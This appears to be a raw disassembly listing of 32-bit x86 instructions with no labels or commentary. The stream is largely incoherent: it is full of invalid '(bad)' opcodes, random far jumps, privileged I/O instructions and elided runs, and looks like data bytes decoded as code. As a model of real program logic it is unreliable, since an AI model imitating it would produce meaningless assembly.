  4033f6:	add    BYTE PTR [eax],al
  4033f8:	je     0x4033fe
  4033fa:	or     ebp,ecx
  4033fc:	cmc    
  4033fd:	mov    ah,0xea
  4033ff:	dec    ecx
  403400:	hlt    
  403401:	lds    ebp,FWORD PTR [ecx+0x62c7f308]
  403407:	mov    esi,0xbd0abec3
  40340c:	ret    
  40340d:	mov    edi,0x4707976c
  403412:	call   0xb11b:0xb707b043
  403419:	enter  0x6f0,0xc0
  40341d:	pop    DWORD PTR [ecx-0xa]
  403420:	leave  
  403421:	out    0x31,eax
  403423:	idiv   BYTE PTR [edi+0x21125d89]
  403429:	popa   
  40342a:	(bad)  
  40342b:	jmp    0xc50d8122
  403430:	mov    cl,0xc
  403432:	jmp    0xd3bc:0xdac07bcd
  403439:	mov    esi,0x9a65bdba
  40343e:	fisubr WORD PTR [ebp-0x49]
  403441:	je     0x403443
  403443:	add    dh,ch
  403445:	sbb    al,0xc1
  403447:	sub    ah,bh
  403449:	pop    es
  40344a:	fnstenv [edx+0x3b]
  40344d:	idiv   edx
  40344f:	or     ch,BYTE PTR [esi+0x7864f8f7]
  403455:	add    ebx,DWORD PTR [ebp-0x7]
  403458:	pusha  
  403459:	rol    DWORD PTR [ebx],1
  40345b:	das    
	...
  40346c:	add    BYTE PTR [eax],al
  40346e:	clc    
  40346f:	(bad)
  403472:	hlt    
  403473:	(bad)  
  403474:	mov    esi,DWORD PTR [edx-0x4fdc4cc3]
  40347a:	inc    ebp
  40347b:	ror    BYTE PTR [ebp+0x1457d97d],0x25
  403482:	test   BYTE PTR [edi],0x56
  403485:	shl    DWORD PTR [edx],0xc8
  403488:	or     edx,ebp
  40348a:	inc    ebx
  40348b:	(bad)  
  40348c:	clc    
  40348d:	mov    edx,0xbafae755
  403492:	dec    ebx
  403493:	mov    DWORD PTR [esi+eiz*8-0x6e5e5b8e],ecx
  40349a:	cmc    
  40349b:	dec    esp
  40349c:	cmp    al,0x28
  40349e:	xor    ecx,DWORD PTR [ebx+eax*1]
  4034a1:	xor    edi,DWORD PTR [ebp-0x43]
  4034a4:	xor    edx,DWORD PTR [eax-0x33]
  4034a7:	mov    dl,0x33
  4034a9:	push   ebx
  4034aa:	outs   dx,DWORD PTR ds:[esi]
  4034ab:	fwait
  4034ac:	pop    ds
  4034ad:	xor    DWORD PTR [ebp+0x51eae7d6],edx
  4034b3:	pop    ss
  4034b4:	shr    DWORD PTR [edx],0xe8
  4034b7:	add    eax,0xf67b62d9
  4034bc:	cli    
  4034bd:	retf   0xf675
  4034c0:	clc    
  4034c1:	ins    BYTE PTR es:[edi],dx
  4034c2:	js     0x4034c6
  4034c4:	out    0x24,al
  4034c6:	push   ebx
  4034c7:	call   0xc7d7dbce
  4034cc:	rol    BYTE PTR [eax],0x84
  4034cf:	add    eax,ebx
  4034d1:	mov    eax,DWORD PTR [eax]
	...
  4034e3:	add    dl,dh
  4034e5:	mov    bl,0xf7
  4034e7:	and    eax,DWORD PTR [eax+0x258dfab3]
  4034ed:	and    dh,dl
  4034ef:	pop    es
  4034f0:	(bad)  
  4034f1:	ret    
  4034f2:	add    edx,DWORD PTR [esi+0x11]
  4034f5:	mov    dl,0x9
  4034f8:	pop    edx
  4034f9:	(bad)  
  4034fa:	mov    edi,eax
  4034fc:	cli    
  4034fd:	js     0x403522
  4034ff:	sti    
  403500:	pop    edx
  403501:	jle    0x403490
  403503:	mov    WORD PTR [esi-0x71],ds
  403506:	or     eax,0x4e0385d5
  40350b:	or     al,0x88
  40350d:	lds    ecx,FWORD PTR [esi]
  40350f:	add    eax,DWORD PTR [ebx+0x5033fa8b]
  403515:	mov    ds:0x898333f7,eax
  40351a:	pushf  
  40351b:	pop    ds
  40351c:	pushf  
  40351d:	adc    DWORD PTR [edx+0x45],ebx
  403520:	or     ch,BYTE PTR [eax]
  403522:	and    cl,al
  403524:	pop    edx
  403525:	adc    al,BYTE PTR [ebx]
  403527:	fst    DWORD PTR [edx+0x2afb337c]
  40352d:	jl     0x403562
  40352f:	stc    
  403530:	jl     0x4034b3
  403532:	pop    es
  403533:	add    eax,0x3a96340
  403538:	xchg   edi,eax
  403539:	mov    cl,0xc0
  40353b:	rcl    ah,0x2
  40353e:	ret    
  40353f:	mov    esi,DWORD PTR [edx]
  403541:	mov    bl,0xf7
  403543:	and    esi,DWORD PTR [eax]
  403545:	mov    bl,0xfa
  403547:	lea    eax,[eax]
	...
  403559:	add    BYTE PTR ds:0xfea3f81f,ah
  40355f:	jns    0x403564
  403561:	push   esi
  403562:	rol    esp,0xc2
  403565:	or     DWORD PTR [edx-0xf07742b],ebx
  40356b:	fdivr  QWORD PTR [ebp-0x442364dd]
  403571:	lea    esp,[eax+esi*4-0x26]
  403575:	add    bl,BYTE PTR [edi]
  403577:	add    DWORD PTR [esi+ecx*2],0xec1eee4
  40357e:	repz in eax,0x8b
  403581:	cli    
  403582:	ret    
  403583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403584:	jecxz  0x40357d
  403586:	and    esp,DWORD PTR [esi+0x26079c91]
  40358c:	push   eax
  40358d:	sub    ch,BYTE PTR [ebp-0x54]
  403590:	pop    ebp
  403591:	xor    BYTE PTR [ecx],dh
  403593:	ins    BYTE PTR es:[edi],dx
  403594:	sbb    BYTE PTR [ebx],al
  403596:	sub    DWORD PTR [edi*4-0x4543b5cd],esi
  40359d:	lea    esi,[eax+eiz*4+0x41]
  4035a1:	cmp    DWORD PTR [edx],edi
  4035a3:	pusha  
  4035a4:	add    eax,DWORD PTR [esi+0x4]
  4035a7:	outs   dx,DWORD PTR ds:[esi]
  4035a8:	les    eax,FWORD PTR [ebx+esi*8]
  4035ab:	ins    BYTE PTR es:[edi],dx
  4035ac:	mov    edi,ebx
  4035ae:	jecxz  0x403546
  4035b0:	repz mul DWORD PTR [ebp+0x5b]
  4035b4:	pop    ss
  4035b5:	add    DWORD PTR [esi],0x9e0386be
  4035bb:	iret   
  4035bc:	(bad)
	...
  4035d0:	jmp    0x40357e
  4035d2:	ror    DWORD PTR [ebx+0x33bb1bf8],cl
  4035d8:	jmp    0xa0cf:0x120f902b
  4035df:	ins    DWORD PTR es:[edi],dx
  4035e0:	repz xchg edi,eax
  4035e2:	out    dx,eax
  4035e3:	shl    BYTE PTR [ecx+0x7bca02de],0x44
  4035ea:	repz test DWORD PTR [ebx],0xdf9c90f7
  4035f1:	fsincos 
  4035f3:	in     al,0xb5
  4035f5:	pop    es
  4035f6:	jmp    0xf317:0x2ac5e85d
  4035fd:	frstor [edx-0x43]
  403600:	jecxz  0x4035be
  403602:	fidivr DWORD PTR [edx+0x47ee8365]
  403608:	call   0x2803:0x2e034579
  40360f:	(bad)  
  403610:	hlt    
  403611:	add    ebp,DWORD PTR [edx]
  403613:	mov    edi,DWORD PTR [ebx-0xc]
  403616:	fcomip st,st(2)
  403618:	mov    dh,BYTE PTR [di+0x16]
  40361c:	cdq    
  40361d:	enter  0x4ab7,0xf3
  403621:	push   eax
  403622:	stc    
  403623:	les    esi,FWORD PTR [edx]
  403625:	or     al,0xea
  403627:	sar    DWORD PTR [ebx-0x41],cl
  40362a:	cli    
  40362b:	mov    edx,0x8f64bd03
  403630:	out    dx,eax
  403631:	and    bh,BYTE PTR es:[ebx+0x0]
	...
  403645:	add    BYTE PTR [esi],bh
  403647:	add    al,0x37
  403649:	and    BYTE PTR [ecx],dh
  40364b:	(bad)  
  40364c:	stc    
  40364d:	add    bh,BYTE PTR [edx]
  40364f:	mov    WORD PTR [ebx-0x700bd80e],ss
  403655:	nop
  403656:	je     0x403670
  403658:	stc    
  403659:	jg     0x4036aa
  40365b:	jns    0x403647
  40365d:	pop    ebp
  40365e:	fadd   st,st(5)
  403660:	stos   BYTE PTR es:[edi],al
  403661:	push   ss
  403662:	repz frstor [edx-0x44]
  403666:	ret    
  403667:	mov    esp,0x827dbb1a
  40366c:	out    0xc5,al
  40366e:	pushfw 
  403670:	add    DWORD PTR [ebx],eax
  403672:	ss repz daa 
  403675:	ret    
  403676:	in     al,dx
  403677:	add    ebp,DWORD PTR [edx]
  403679:	mov    cl,bl
  40367b:	repz aas 
  40367d:	repnz mov edi,0xe65d0089
  403683:	mov    esp,0x3898827
  403688:	push   ss
  403689:	sub    BYTE PTR [ecx+0x7a39030b],dh
  40368f:	mov    esi,0xbda21233
  403694:	lea    ebx,[ebp-0x1a]
  403697:	xor    DWORD PTR [eax],0x4e03a716
  40369d:	in     eax,dx
  40369e:	lods   al,BYTE PTR ds:[esi]
  40369f:	lds    edx,FWORD PTR [eax]
  4036a1:	jmp    0xf33b:0xbafa8ba9
  4036a8:	clc    
  4036a9:	je     0x4036ab
	...
  4036bb:	add    BYTE PTR [eax+0x7bfc0517],dl
  4036c1:	add    al,BYTE PTR [ebx]
  4036c3:	aaa    
  4036c4:	cld    
  4036c5:	(bad)
  4036c8:	lock fisttp QWORD PTR [ebx+0x33bd41c0]
  4036cf:	ret    0x8277
  4036d2:	pop    es
  4036d3:	lock and edx,edx
  4036d6:	fldl2e 
  4036d8:	lods   eax,DWORD PTR ds:[esi]
  4036d9:	loop   0x40369b
  4036db:	test   eax,0x72c303f8
  4036e0:	imul   esi,ebx,0x895bdaf8
  4036e6:	xchg   esp,eax
  4036e7:	test   BYTE PTR [esi-0x63],0xdb
  4036eb:	(bad)  
  4036ec:	icebp  
  4036ed:	push   eax
  4036ee:	xor    BYTE PTR [eax-0x66fcf4ce],ch
  4036f4:	imul   edi,DWORD PTR [esi-0x42fe8dcd],0xaefd758d
  4036fe:	jl     0x40368b
  403700:	add    eax,0xb3154e0a
  403705:	enter  0xea10,0xa9
  403709:	cmp    dl,0x0
  40370c:	retf   0x3372
  40370f:	stc    
  403710:	push   esp
  403711:	addr16 pop ds
  403713:	gs pop edi
  403715:	les    eax,FWORD PTR es:[ebx]
  403718:	addr16 add al,cl
  40371b:	ret    
  40371c:	scas   al,BYTE PTR es:[edi]
  40371d:	pop    es
  40371e:	fnstcw WORD PTR [edi+0x0]
	...
  403730:	add    BYTE PTR [eax],al
  403732:	push   es
  403733:	je     0x403734
  403735:	(bad)  
  403736:	mov    edx,0xbafb0b70
  40373b:	jno    0x4036ca
  40373d:	test   BYTE PTR [esi+0x7d29224e],bl
  403743:	pop    es
  403744:	push   es
  403745:	ror    ecx,0xc
  403748:	add    eax,ebx
  40374a:	(bad)  
  40374b:	jae    0x40374c
  40374d:	call   DWORD PTR [esi-0x49]
  403750:	clc    
  403751:	or     edx,DWORD PTR [ecx-0x49]
  403754:	cli    
  403755:	(bad)  
  403756:	fstp   QWORD PTR [edx]
  403758:	xchg   edi,eax
  403759:	push   ebx
  40375b:	inc    edi
  40375c:	add    edx,DWORD PTR [esi+0x55]
  40375f:	leave  
  403760:	ret    0x5a0a
  403763:	fidivr DWORD PTR [edi-0x8c7901]
  403769:	xor    eax,DWORD PTR [edx+0x5133f9ff]
  40376f:	test   DWORD PTR [edi+ecx*1-0x546c5952],ecx
  403776:	or     al,BYTE PTR [eax+edi*1-0x3f]
  40377a:	dec    eax
  40377b:	add    eax,DWORD PTR [ebx]
  40377d:	retf   0x72b6
  403780:	(bad)  
  403781:	inc    DWORD PTR [esi-0x7ff4084a]
  403787:	mov    dh,0xf9
  403789:	lea    esp,[ebp+0x6aa03912]
  40378f:	jbe    0x403794
  403791:	pop    esi
  403792:	(bad)  
  403794:	ret    
  403795:	adc    eax,0x0
	...
  4037a6:	add    BYTE PTR [eax],al
  4037a8:	lock mov al,ds:0x44d7bfda
  4037ae:	mov    esp,0x84a03ff
  4037b3:	sti    
  4037b4:	add    eax,DWORD PTR [edi-0x72]
  4037b7:	test   bh,dh
  4037b9:	loopne 0x403814
  4037bb:	pop    ebx
  4037bc:	dec    ebp
  4037bd:	mov    eax,ds:0xdfb13045
  4037c2:	add    al,0x3
  4037c4:	mov    bl,0x54
  4037c6:	mov    esp,0xf01c9fff
  4037cb:	clc    
  4037cc:	jmp    0x4037e5
  4037ce:	lock cli 
  4037d0:	jge    0x403825
  4037d2:	adc    al,0x92
  4037d4:	mov    ah,0xa3
  4037d6:	mov    WORD PTR [ebx],es
  4037d8:	lods   al,BYTE PTR es:[esi]
  4037da:	ret    0xeac2
  4037dd:	mov    al,ds:0xac6fbfd3
  4037e2:	mov    ebx,0xfa923ff
  4037e7:	cli    
  4037e8:	and    ebx,eax
  4037ea:	mov    DWORD PTR [edi+eiz*8+0x4fefb042],ecx
  4037f1:	mov    al,ds:0x5e312849
  4037f6:	or     eax,DWORD PTR [ebx]
  4037f8:	sub    bh,BYTE PTR [ebx+edi*4]
  4037fb:	push   DWORD PTR [edi]
  4037fd:	fs div edi
  403800:	sti    
  403801:	idiv   cx
  403804:	jne    0x403839
  403806:	sbb    edx,ecx
  403808:	mov    ebp,0x38123
	...
  40381d:	add    BYTE PTR [esi-0x1a3c3b55],dh
  403823:	mov    al,ds:0x3407bfdc
  403828:	mov    ebx,0xf39c3ff
  40382d:	sti    
  40382e:	ret    
  40382f:	mov    DWORD PTR ss:[edi+esi*8-0x67c649fa],eax
  403837:	and    al,0xea
  403839:	inc    ecx
  40383a:	adc    dh,al
  40383c:	sub    DWORD PTR [edx],eax
  40383e:	repz (bad) 
  403840:	mov    ?,WORD PTR [ebx-0x8b94b31]
  403846:	enter  0x4100,0xf7
  40384a:	mov    edx,0xd0135d82
  40384f:	lods   eax,DWORD PTR ds:[esi]
  403850:	std    
  403851:	mov    ecx,0xc4e55cf3
  403856:	mov    dl,0x1
  403858:	jmp    0x97bb:0x16b45fd3
  40385f:	clc    
  403860:	adc    DWORD PTR [edi],ecx
  403862:	mov    bh,al
  403864:	add    BYTE PTR [ecx+0x46d50474],cl
  40386a:	icebp  
  40386b:	addr16 jmp 0xf30b:0x28c5d849
  403873:	shl    BYTE PTR [esi-0x214b9846],0xf6
  40387a:	addr16 add al,dl
  40387d:	neg    BYTE PTR [ecx-0x7e]
  403880:	ins    DWORD PTR es:[edi],dx
  403881:	sbb    al,BYTE PTR [eax]
	...
  403893:	add    BYTE PTR [ecx-0xcb60eea],dl
  403899:	push   esp
  40389a:	cmc    
  40389b:	les    esi,FWORD PTR [ebx]
  40389d:	sbb    ch,dl
  40389f:	fdiv   QWORD PTR [edi-0x4c]
  4038a2:	scas   al,BYTE PTR es:[edi]
  4038a3:	mov    edx,0xea2f82f
  4038a8:	sub    edi,eax
  4038aa:	lahf   
  4038ab:	mov    BYTE PTR [esp+ecx*1+0x6b],dh
  4038af:	cmp    ebx,eax
  4038b1:	mov    ebx,0xc5e041ea
  4038b6:	test   eax,0x3ec7f301
  4038bb:	mov    edx,0x7600b3ff
  4038c0:	(bad)  
  4038c1:	scas   al,BYTE PTR es:[edi]
  4038c2:	or     esi,DWORD PTR [ecx-0x1a]
  4038c5:	mov    al,0x8d
  4038c7:	jge    0x4038cb
  4038c9:	cli    
  4038ca:	icebp  
  4038cb:	and    ebx,DWORD PTR [ecx+0x8]
  4038ce:	push   esi
  4038cf:	add    eax,0xea0ac8ad
  4038d4:	mov    ds:0x8a46ff73,eax
  4038d9:	mov    bl,0x33
  4038db:	inc    edx
  4038dc:	out    dx,al
  4038dd:	mov    al,0x33
  4038df:	xor    DWORD PTR [eax-0x7e],ebp
  4038e2:	(bad)  
  4038e4:	vcvtsi2sd xmm5,xmm4,edx
  4038e8:	cmp    edi,edi
  4038ea:	shr    BYTE PTR [eax],0xea
  4038ed:	pop    es
  4038ee:	retf   0x5a56
  4038f1:	mov    bl,0xff
  4038f3:	push   cs
  4038f4:	xchg   BYTE PTR [ebx+0xb],bh
	...
  40390a:	jle    0x4038b9
  40390c:	lea    ebx,[ebp-0x26]
  40390f:	xchg   ebp,eax
  403910:	shr    DWORD PTR [edi+0x46],cl
  403913:	pop    es
  403914:	pop    esi
  403915:	lds    esi,FWORD PTR [edi+eax*8]
  403918:	adc    eax,0x7d7f4aea
  40391d:	icebp  
  40391e:	repnz or eax,DWORD PTR [ecx]
  403921:	ss lock add eax,0x5bf2e14f
  403928:	or     al,0xc6
  40392a:	scas   eax,DWORD PTR es:[edi]
  40392b:	mov    dl,0x8d
  40392d:	aaa    
  40392e:	mov    ah,0x3
  403930:	mov    esi,esp
  403932:	jne    0x4038e7
  403934:	call   DWORD PTR [ebx]
  403936:	retf   
  403937:	dec    edi
  403938:	pop    eax
  403939:	inc    esi
  40393a:	retf   0xc2bd
  40393d:	in     eax,dx
  40393e:	repz pop ecx
  403940:	mov    eax,DWORD PTR [ebp+0x36f8ca6d]
  403946:	mov    ds:0xd400c757,al
  40394b:	outs   dx,BYTE PTR ds:[esi]
  40394c:	add    BYTE PTR [eax],al
  40394e:	or     DWORD PTR [edi],eax
  403950:	push   DWORD PTR [ebp+0xd]
  403953:	jle    0x40399a
  403955:	clc    
  403956:	xchg   esi,eax
  403957:	mov    dl,0x6f
  403959:	gs cwde 
  40395b:	push   es
  40395c:	add    DWORD PTR [ebx],esp
  40395e:	xchg   esp,eax
  40395f:	out    0xc6,eax
  403961:	add    eax,0x4111b5
  403966:	push   eax
  403967:	and    al,0xcd
  403969:	out    dx,eax
  40396a:	push   ss
  40396b:	mov    dl,0x77
  40396d:	add    BYTE PTR gs:[eax],al
	...
  403980:	mov    BYTE PTR [esi],al
  403982:	(bad)  
  403983:	fadd   QWORD PTR [ebx-0x6d]
  403986:	mov    DWORD PTR ds:0x41115d,0x10324287
  403990:	(bad)  
  403991:	mov    cl,0x7f
  403993:	gs dec eax
  403995:	push   es
  403996:	lock loope 0x403964
  403999:	retf   
  40399a:	jmp    0x4039b8
  40399c:	add    dh,dl
  40399e:	pop    es
  40399f:	add    edx,DWORD PTR [edx+edi*2+0x6a]
  4039a3:	inc    eax
  4039a4:	jno    0x4039d8
  4039a6:	gs inc ecx
  4039a8:	pop    ecx
  4039a9:	push   esi
  4039aa:	call   0xffaf7a12
  4039af:	adc    DWORD PTR [edi+ebp*2],0x40
  4039b3:	call   0x404045
  4039b8:	(bad)  
  4039ba:	test   DWORD PTR [eax+0xa],0x315d8bcd
  4039c1:	mov    eax,ebx
  4039c3:	inc    eax
  4039c4:	shl    al,cl
  4039c6:	pop    es
  4039c7:	add    edx,esp
  4039c9:	outs   dx,BYTE PTR ds:[esi]
  4039ca:	push   ebx
  4039cb:	push   0x411095
  4039d0:	fldenv [edx+0x3c]
  4039d3:	jmp    0x1f8d2c8
  4039d8:	lods   eax,DWORD PTR ds:[esi]
  4039d9:	add    ecx,0xffffff83
  4039dc:	ins    BYTE PTR es:[edi],dx
  4039dd:	add    eax,DWORD PTR [ebx+0x0]
  4039e0:	jo     0x4039ff
  4039e2:	lods   al,BYTE PTR ds:[esi]
  4039e3:	aaa    
	...
  4039f4:	add    BYTE PTR [eax],al
  4039f6:	jle    0x4039cc
  4039f8:	test   bl,ch
  4039fa:	clc    
  4039fb:	mov    ebx,0xe393800d
  403a00:	sbb    eax,0x449ff041
  403a05:	js     0x4039e5
  403a07:	inc    edi
  403a08:	mov    WORD PTR [eax],es
  403a0a:	lock lahf 
  403a0c:	jl     0x4039d6
  403a0e:	(bad)  
  403a0f:	dec    eax
  403a10:	mov    eax,0xd7bf2eb
  403a15:	adc    BYTE PTR [ebx-0xfbee1c5],0x9f
  403a1c:	inc    esp
  403a1d:	js     0x4039bd
  403a1f:	xor    al,0x3e
  403a21:	or     al,0x59
  403a23:	mov    bh,0x3
  403a25:	add    al,dh
  403a27:	int3   
  403a28:	aad    0xf7
  403a2a:	xchg   ecx,eax
  403a2b:	ror    bl,1
  403a2d:	btc    DWORD PTR [ebx+eax*8],0x65
  403a32:	xor    DWORD PTR [eax-0x7dcbea76],esp
  403a38:	inc    edx
  403a39:	add    BYTE PTR [eax-0x69],bl
  403a3c:	add    eax,DWORD PTR [eax]
  403a3e:	lock jle 0x403a75
  403a41:	gs mov cl,0x9f
  403a44:	mov    dl,BYTE PTR ds:0x4542dc
  403a4a:	jnp    0x403a1e
  403a4c:	cmp    esp,DWORD PTR [ebp-0x4f]
  403a4f:	lahf   
  403a50:	push   es
  403a51:	enter  0x75ef,0x7
  403a55:	leave  
  403a56:	xchg   ebx,eax
  403a57:	out    dx,eax
  403a58:	and    BYTE PTR [ecx+0x0],al
	...
  403a6b:	add    al,dh
  403a6d:	adc    DWORD PTR es:[ebp+ecx*4+0x6],esi
  403a72:	sub    BYTE PTR [ecx+ebp*2],al
  403a75:	add    esp,DWORD PTR [ecx]
  403a77:	and    DWORD PTR [ecx-0x6ac7b7fa],esi
  403a7d:	inc    edi
  403a7e:	jmp    0xcc7180d
  403a83:	inc    ebp
  403a84:	lock add DWORD PTR [ecx-0xa9ad5f9],esi
  403a8b:	and    BYTE PTR [ecx],dh
  403a8d:	pop    es
  403a8e:	pusha  
  403a8f:	adc    DWORD PTR [eax+0x2a],esi
  403a92:	test   al,0x3
  403a94:	dec    edx
  403a95:	sbb    ebx,DWORD PTR [esi+0x31]
  403a98:	add    BYTE PTR [edi],bl
  403a9a:	fldenv [eax]
  403a9c:	xor    DWORD PTR [edi],eax
  403a9e:	inc    ecx
  403a9f:	xchg   ecx,eax
  403aa0:	fdiv   DWORD PTR [eax+0x501e5b46]
  403aa6:	xor    dl,al
  403aa8:	in     al,0x6
  403aaa:	pushf  
  403aab:	mov    bl,BYTE PTR [esp+eax*4-0x509643db]
  403ab2:	es mov bh,0x9f
  403ab5:	jl     0x403a9c
  403ab7:	enter  0x2aac,0xa8
  403abb:	add    edi,DWORD PTR [ebx+0x1b]
  403abe:	sbb    al,0xcc
  403ac0:	or     eax,0xa806e946
  403ac5:	add    BYTE PTR [ebx],dh
  403ac7:	(bad)  
  403ac8:	in     al,dx
  403ac9:	shr    DWORD PTR ds:0x6006b121,0x10
	...
  403ae0:	add    BYTE PTR [eax],al
  403ae2:	xor    eax,0xf0454cbf
  403ae7:	inc    ebp
  403ae8:	push   esp
  403ae9:	fstp   DWORD PTR [ecx+0x4fb6d6c7]
  403aef:	jl     0x403ad6
  403af1:	mov    BYTE PTR [eax+0x6b042829],cl
  403af7:	sbb    ebp,DWORD PTR [edi+ebx*2-0x32]
  403afb:	inc    ebp
  403afc:	add    cl,ch
  403afe:	and    al,BYTE PTR [ecx*4+0x46055d]
  403b05:	(bad)  
  403b07:	add    DWORD PTR [edi+eax*1-0x54ccf953],0xe589c724
  403b12:	js     0x403adf
  403b14:	data16 sub ah,dh
  403b17:	inc    ebp
  403b18:	jne    0x403ab1
  403b1a:	push   0x12
  403b1c:	jo     0x403b2a
  403b1e:	xor    eax,0x17b48b07
  403b23:	sub    al,BYTE PTR [ecx-0x17]
  403b26:	push   0xfffffff1
  403b28:	ja     0x403aee
  403b2a:	sub    al,0x7
  403b2c:	call   FWORD PTR [eax+ecx*1]
  403b2f:	sub    al,BYTE PTR [ecx-0x17]
  403b32:	outs   dx,BYTE PTR ds:[esi]
  403b33:	dec    ecx
  403b34:	cld    
  403b35:	inc    esi
  403b36:	shr    BYTE PTR [edi],0x65
  403b39:	test   al,0xf3
  403b3b:	jg     0x403b82
  403b3d:	xor    DWORD PTR [ebx+eiz*4],ebp
  403b40:	jmp    FWORD PTR [esi]
  403b42:	pop    esi
  403b43:	jnp    0x403b1b
  403b45:	jb     0x403b47
	...
  403b57:	add    BYTE PTR [esi-0x49],bl
  403b5a:	ror    dl,cl
  403b5c:	push   ebp
  403b5d:	jecxz  0x403bb3
  403b5f:	adc    eax,0xe503c4fa
  403b64:	js     0x403b40
  403b66:	gs test al,0xf3
  403b69:	add    eax,DWORD PTR [ebp+0x1]
  403b6c:	lock lea edi,[ecx+0x6b]
  403b70:	leave  
  403b71:	scas   eax,DWORD PTR es:[edi]
  403b72:	jne    0x403b61
  403b74:	ins    DWORD PTR es:[edi],dx
  403b75:	dec    ecx
  403b76:	clc    
  403b77:	jo     0x403ba0
  403b79:	mov    bl,0xc1
  403b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b7c:	(bad)  
  403b7d:	jnp    0x403b7d
  403b7f:	bound  eax,QWORD PTR [ecx-0xf1b3c3b]
  403b85:	into   
  403b86:	inc    ecx
  403b87:	add    ah,bh
  403b89:	mov    esi,0x7976ecb9
  403b8e:	dec    DWORD PTR [ebx+0x33d77d5f]
  403b94:	int3   
  403b95:	outs   dx,BYTE PTR ds:[esi]
  403b96:	xor    eax,edx
  403b98:	or     ch,BYTE PTR [edi+0x43ef248c]
  403b9e:	add    BYTE PTR [ebx],al
  403ba0:	fdiv   QWORD PTR [edx+0x5]
  403ba3:	mov    eax,ds:0xff6ecb72
  403ba8:	cld    
  403ba9:	jbe    0x403b3a
  403bab:	inc    ebp
  403bac:	jno    0x403c29
  403bae:	jge    0x403bac
  403bb0:	cwde   
  403bb1:	ins    DWORD PTR es:[edi],dx
  403bb2:	push   ds
  403bb3:	mov    edx,DWORD PTR [edi-0x80]
  403bb6:	repz ror DWORD PTR [edx],0xae
  403bba:	add    bl,al
	...
  403bcc:	add    BYTE PTR [eax],al
  403bce:	mov    ch,bl
  403bd0:	iret   
  403bd1:	mov    ecx,0xffff7435
  403bd6:	push   edx
  403bd7:	ins    BYTE PTR es:[edi],dx
  403bd8:	mov    edx,DWORD PTR [ebp+0x35]
  403bdb:	add    BYTE PTR [ebp-0x4],al
  403bde:	jmp    0x3c8:0x92c623bb
  403be5:	add    al,0x44
  403be7:	mul    DWORD PTR [ebp+0x41]
  403bea:	mov    DWORD PTR [edi],eax
  403bec:	inc    ebp
  403bed:	clc    
  403bee:	mov    esi,ss
  403bf0:	mov    esp,0x7574161b
  403bf5:	cld    
  403bf6:	es out dx,al
  403bf8:	test   DWORD PTR [ecx-0x393e898c],0x8bfe7f97
  403c02:	push   0xffffffc9
  403c04:	ret    
  403c05:	add    eax,0x7541d25a
  403c0a:	mov    ds:0x36ffec31,al
  403c0f:	jae    0x403b9c
  403c11:	(bad)  
  403c12:	lock sub ah,cl
  403c15:	xor    ebp,DWORD PTR [ebp-0xc3e0f45]
  403c1b:	fwait
  403c1c:	xchg   ah,al
  403c1e:	into   
  403c1f:	fiadd  WORD PTR [ebx]
  403c21:	add    esi,DWORD PTR [ebp+0x31d5fe77]
  403c27:	inc    edx
  403c28:	retf   0xa5ff
  403c2b:	arpl   WORD PTR [ebp+eax*2-0x3c9c8e8],ax
	...
  403c42:	add    BYTE PTR [eax],al
  403c44:	xor    DWORD PTR [esi+0x15],ebx
  403c47:	mov    eax,DWORD PTR [esi]
  403c49:	sub    DWORD PTR [eax+0x9b33c1],esi
  403c4f:	fdiv   DWORD PTR [ecx+0xd01d3b2]
  403c55:	mov    al,0x1e
  403c57:	inc    ecx
  403c58:	lock sahf 
  403c5a:	out    dx,al
  403c5b:	jae    0x403cb2
  403c5d:	pop    edi
  403c5e:	add    eax,DWORD PTR [ecx]
  403c60:	adc    eax,0xf0411ea8
  403c65:	sub    BYTE PTR [esi],bh
  403c67:	cld    
  403c68:	icebp  
  403c69:	mov    ds:0xa0316537,al
  403c6e:	mov    BYTE PTR [ebp-0x48],al
  403c71:	sahf   
  403c72:	(bad)  
  403c73:	jg     0x403c8a
  403c75:	pop    edi
  403c76:	add    ecx,ecx
  403c78:	mov    bl,0x92
  403c7a:	mov    ah,ch
  403c7c:	lahf   
  403c7d:	mov    cl,BYTE PTR [ebx]
  403c7f:	call   0x4363a5
  403c84:	jae    0x403c9d
  403c86:	mov    ah,0x75
  403c88:	into   
  403c89:	cld    
  403c8a:	sub    eax,0x7a998808
  403c8f:	add    al,dh
  403c91:	mov    eax,0xf7f775c3
  403c96:	mov    bl,0xff
  403c98:	addr16 pushf 
  403c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9b:	adc    ebp,DWORD PTR [ebx+0x6]
  403c9e:	sub    DWORD PTR [eax],eax
  403ca0:	add    BYTE PTR [ecx],0xa9
  403ca3:	cmp    edi,esi
  403ca5:	outs   dx,BYTE PTR ds:[esi]
  403ca6:	(bad)  
  403ca7:	mov    bl,0x0
	...
  403cb9:	add    BYTE PTR [edi-0x53],al
  403cbc:	ret    0x6b08
  403cbf:	push   es
  403cc0:	jb     0x403cc6
  403cc2:	sub    eax,ecx
  403cc4:	in     eax,0x3
  403cc6:	lds    eax,FWORD PTR [ecx-0x49d3783b]
  403ccc:	sbb    dh,bh
  403cce:	cmp    ah,BYTE PTR [eax]
  403cd0:	out    dx,eax
  403cd1:	sbb    eax,0x9beb20f1
  403cd6:	retf   0xe96f
  403cd9:	add    esi,DWORD PTR [ebx-0x52]
  403cdc:	mov    ?,WORD PTR [ecx]
  403cde:	repnz mov eax,ds:0x20187f0b
  403ce4:	fld    DWORD PTR [eax-0x63e648cb]
  403cea:	js     0x403c91
  403cec:	outs   dx,BYTE PTR ds:[esi]
  403ced:	mov    bl,0x56
  403cef:	les    ebp,FWORD PTR [ebx+esi*4+0x417206f2]
  403cf6:	loopne 0x403c7c
  403cf8:	and    al,0x2a
  403cfa:	jns    0x403d36
  403cfc:	pop    ebx
  403cfd:	xchg   DWORD PTR ds:0xed37e8fb,edi
  403d03:	jg     0x403ca9
  403d05:	call   FWORD PTR [edx-0xbce95f4]
  403d0b:	push   es
  403d0c:	mov    ah,0xfd
  403d0e:	jb     0x403d3a
  403d10:	icebp  
  403d11:	add    ebx,DWORD PTR ds:0x9ae91203
  403d17:	cld    
  403d18:	adc    eax,0x7d9ef839
  403d1d:	mov    dl,0x0
	...
  403d2f:	add    BYTE PTR [edi-0x54],bh
  403d32:	push   0xffffffac
  403d34:	ja     0x403d68
  403d36:	jmp    0x403cd6
  403d38:	add    al,0x7e
  403d3a:	add    BYTE PTR [edi+ebx*4-0x56a3efdf],ch
  403d41:	mov    dh,0x50
  403d43:	cmp    dh,BYTE PTR [ebx+eiz*4-0x48]
  403d47:	jmp    0xd738c53f
